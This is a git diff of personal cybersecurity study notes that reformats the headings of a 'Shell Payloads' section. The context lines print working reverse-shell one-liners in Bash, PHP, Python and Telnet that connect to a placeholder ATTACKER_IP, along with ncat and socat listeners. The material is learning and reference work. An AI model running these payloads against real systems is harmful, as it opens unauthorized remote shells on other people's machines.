@@ -53,6 +53,7 @@ Collection of notes regarding Cybersecurity vocabulary for my personal reference
 + [Hydra](#hydra)
 + [Gobuster](#gobuster)
 + [Shells](#shells)
+    +[Shell Payloads](#shell-payloads)
 + [SQLMap](#sqlmap)
 ### Defensive Security Concepts
 + [SOC](#soc)
@@ -2131,10 +2132,10 @@ ncat --ssl -lvnp 4444
 socat -d -d TCP-LISTEN:443 STDOUT
 ```
 
-### Shell Payloads
+## Shell Payloads
 Shell payloads can be commands or scripts that exposes the shell into incoming connections (i.e. bind shell) or send a connection (i.e. reverse shell).
 
-#### Bash
+### Bash
 E.g. Normal bash reverse shell
 ```
 bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
@@ -2152,7 +2153,7 @@ E.g. Bash with file descripter 5 reverse shell
 bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
 ```
 
-#### PHP
+### PHP
 E.g. PHP reverse shell using the exec function
 ```
 php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
@@ -2174,7 +2175,7 @@ E.g. PHP reverse shell using the popen function
 php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
 ```
 
-#### Python
+### Python
 E.g. Python reverse shell by exporting environmental variables
 ```
 export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
@@ -2188,7 +2189,7 @@ E.g. Short Python reverse shell
 python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
 ```
 
-#### Others
+### Others
 E.g. Telnet
 ```
 TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
